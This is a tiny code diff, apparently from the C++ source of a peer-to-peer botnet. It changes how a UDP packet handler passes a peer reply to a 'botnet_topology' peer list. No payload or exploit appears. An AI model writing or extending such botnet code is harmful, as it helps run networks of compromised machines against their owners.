@@ -151,7 +151,7 @@ static void handle_udp_connections()
 	case PACK_TYPE::SYNC_REPLY:
 		break;
 	case PACK_TYPE::PEER_REPLY:
-		botnet_topology.addPeer(p.peer.ip, p.peer.port);
+		botnet_topology.addPeer(p, udp_sock);
 		break;
 	}
 }
